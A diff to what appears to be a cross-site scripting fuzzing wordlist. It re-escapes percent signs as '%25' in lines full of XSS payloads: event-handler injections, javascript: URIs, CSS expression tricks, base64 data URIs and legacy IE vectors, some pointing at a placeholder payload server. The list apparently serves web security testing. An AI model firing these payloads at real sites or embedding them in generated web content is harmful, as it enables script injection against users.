@@ -25,7 +25,7 @@
 1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=<img/src=&quot;.&quot;onerror=javascript:alert(1)>>
 1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`<img/src=&quot;x&quot;onerror=alert(1)>`>
 1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`<img/src=&quot;x&quot;onerror=javascript:alert(1)>`>
-1<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=test.vml#kcf></vmlframe>
+1<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%25;height:100%25 src=test.vml#kcf></vmlframe>
 '%20onmouseover=alert(1)'
 --><!-- --%21> <img src=xxx:x onerror=javascript:alert(1)> -->
 %22%20onmouseover=javascript:alert(1)%20%22
@@ -179,7 +179,7 @@ alert(String.fromCharCode(75,67,70))//";alert(String.fromCharCode(75,67,70))//--
 <a style="-o-link:'javascript:alert(1)';-o-link-source:current">X</a>
 <a style="-o-link:'javascript:javascript:alert(1)';-o-link-source:current">X
 <a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="alert(1);">XXX</a></a><a href="javascript:alert(2)">XXX</a>
-<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="javascript:alert(1);">KCF</a></a><a href="javascript:javascript:alert(1)">KCF</a><style>*[{}@import'%(css)s?]</style>X
+<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="javascript:alert(1);">KCF</a></a><a href="javascript:javascript:alert(1)">KCF</a><style>*[{}@import'%25(css)s?]</style>X
 <audio src=1 href=1 onerror="javascript:alert(1)"></audio>
 <audio src=1 onerror=alert(1)>
 <b/alt="1"onmouseover=InputBox+1language=vbs>KCF</b>
@@ -282,7 +282,7 @@ data:text/html,<script>alert(1)</script>
 <div style="binding: url(http://XXXxenotixXXX:3555/xss_serve_payloads/kcf.html));">
 <div style="color:red'{} x:expression(alert(1))">.</div>
 <div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(1)></div>
-<div style=content:url(%(svg)s)></div>
+<div style=content:url(%25(svg)s)></div>
 <div style="font-family:'foo&#10;;color:red;';">KCF
 <div style="font-family:'foo[a];color:red;';">XXX</div>
 <div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X
@@ -295,8 +295,8 @@ data:text/html,<script>alert(1)</script>
 <div style="kcf:expression(alert(1))">kcf/div>
 <div style="list-style:url(http://foo.f)\20url(javascript:alert(1));">X</div>
 <div style="list-style:url(http://foo.f)\20url(javascript:javascript:alert(1));">X
-<div  style="position:absolute;top:0;left:0;width:100%;height:100%"  onmouseover="prompt(1)" onclick="alert(1)">x</button>​
-<div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button>
+<div  style="position:absolute;top:0;left:0;width:100%25;height:100%25"  onmouseover="prompt(1)" onclick="alert(1)">x</button>​
+<div style="position:absolute;top:0;left:0;width:100%25;height:100%25" onmouseover="prompt(1)" onclick="alert(1)">x</button>
 <div style=width:1px;filter:glow onfilterchange=alert(1)>x</div>
 <div style=width:1px;filter:glow onfilterchange=javascript:alert(1)>x
 <div style=width:1px;filter:glow onfilterchange=prompt(1)>x</div>
@@ -310,16 +310,16 @@ data:text/html,<script>alert(1)</script>
 <embed code="http://XXXxenotixXXX:3555/xss_serve_payloads/flash.swf" allowscriptaccess=always>​
 <embed code="http://XXXxenotixXXX:3555/xss_serve_payloads/kcf.swf" allowscriptaccess=always>
 <embed code=javascript:javascript:alert(1);></embed>
-<embed code=%(scriptlet)s></embed>
+<embed code=%25(scriptlet)s></embed>
 <EMBED SRC="data:image/svg+xml;base64,PHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4=" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
-<embed src="data:text/html;base64,%(base64)s">
+<embed src="data:text/html;base64,%25(base64)s">
 <embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4="></embed>
 <EMBED SRC="http://XXXxenotixXXX:3555/xss_serve_payloads/flash.swf"></EMBED>
 <embed src="javascript:alert(1)">
 <embed src=javascript:alert(1)>
-<embed src=%(jscript)s></embed>
-<embed type="image" src=%(scriptlet)s></embed>
-<embed width=500 height=500 code="data:text/html,<script>%(payload)s</script>"></embed>
+<embed src=%25(jscript)s></embed>
+<embed type="image" src=%25(scriptlet)s></embed>
+<embed width=500 height=500 code="data:text/html,<script>%25(payload)s</script>"></embed>
 <!ENTITY x "&#x3C;html:img&#x20;src='x'&#x20;xmlns:html='http://www.w3.org/1999/xhtml'&#x20;onerror='alert(1)'/&#x3E;">
 <event-source src="%(event)s" onload="javascript:alert(1)">
 <event-source src=javascript:alert(1)>
@@ -338,9 +338,9 @@ foo%00<script>alert(1)</script>
 <? foo="><script>javascript:alert(1)</script>">
 </ foo="><script>javascript:alert(1)</script>">
 <? foo="><x foo='?><script>alert(1)</script>'>">
-<% foo><x foo="%><script>alert(1)</script>">
+<%25 foo><x foo="%25><script>alert(1)</script>">
 <? foo="><x foo='?><script>javascript:alert(1)</script>'>">
-<% foo><x foo="%><script>javascript:alert(1)</script>">
+<%25 foo><x foo="%25><script>javascript:alert(1)</script>">
 //<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
 <form><a href="javascript:%0061lert&#x28;1&#x29;">X
 <form><button formaction="javascript:alert(1)">X</button>
@@ -671,7 +671,7 @@ kcf%20%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E
 "'`>kcf<div style="font-family:'foo'x:expression(alert(1));/*';">kcf
 kcf<div style="x:expression(alert(1))">kcf
 kcf<div style="xexpression(alert(1))">kcf
-<KCF STYLE="behavior: url(%(htc)s);">
+<KCF STYLE="behavior: url(%25(htc)s);">
 <KCF STYLE="behavior: url(KCF.htc);">
 <KCF STYLE="kcf:expression(alert(1))">
 <KCF STYLE="KCF:expression(alert(1))">
@@ -686,7 +686,7 @@ kcf<div style="xexpression(alert(1))">kcf
 <LINK REL="stylesheet" HREF="javascript:alert('KCF');">
 <LINK REL="stylesheet" HREF="javascript:javascript:alert(1);">
 <li style=list-style:url() onerror=alert(1)></li>
-<li style=list-style:url() onerror=javascript:alert(1)> <div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(1)></div>
+<li style=list-style:url() onerror=javascript:alert(1)> <div style=content:url(data:image/svg+xml,%25%3Csvg/%25%3E);visibility:hidden onload=javascript:alert(1)></div>
 <marquee onScroll marquee onScroll="javascript:javascript:alert(1)"></marquee onScroll>
 <marquee onstart='javascript:alert&#x28;1&#x29;'>^__^
 <marquee onStart marquee onStart="javascript:javascript:alert(1)"></marquee onStart>
@@ -1178,7 +1178,7 @@ X<form id=test onforminput=javascript:alert(1)><input></form>
 <XML ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert(1);">]]>
 <XML ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert(1);">]]></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
 <XML ID=I><X><C><![CDATA[<IMG SRC="javas]]<![CDATA[cript:javascript:alert(1);">]]</C><X></xml>
-<xml id="kcf" src="%(htc)s"></xml> <label dataformatas="html" datasrc="#kcf" datafld="payload"></label>
+<xml id="kcf" src="%25(htc)s"></xml> <label dataformatas="html" datasrc="#kcf" datafld="payload"></label>
 <xml id="kcf" src="test.htc"></xml><label dataformatas="html" datasrc="#kcf" datafld="payload"></label>
 <xml id="X"><a><b><script>alert(1);</script>;</b></a></xml>
 <?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
@@ -1192,7 +1192,7 @@ X<form id=test onforminput=javascript:alert(1)><input></form>
 <?xml-stylesheet type="text/xsl" href="#" ?> <stylesheet xmlns="http://www.w3.org/TR/WD-xsl"> <template match="/"> <eval>new ActiveXObject(&apos;htmlfile&apos;).parentWindow.
 <?xml version="1.0"?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>javascript:alert(1);</html:script></html:html>
 <?xml version="1.0"?> x><payload><![CDATA[<img src=x onerror=alert(1)>]]></payload></x>
-<xmp> <% </xmp> <img alt='%></xmp><img src=xx:x onerror=alert(1)//'>  <script> x='<%' </script> %>/ alert(2) </script>  XXX <style> *['<!--']{} </style> -->{} *{color:red}</style>
+<xmp> <%25 </xmp> <img alt='%25></xmp><img src=xx:x onerror=alert(1)//'>  <script> x='<%25' </script> %25>/ alert(2) </script>  XXX <style> *['<!--']{} </style> -->{} *{color:red}</style>
 <x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1);</x:script>
 <x style="background:url('x&#1;;color:red;/*')">KCF</x>
 <x style="background:url('x[a];color:red;/*')">XXX</x>
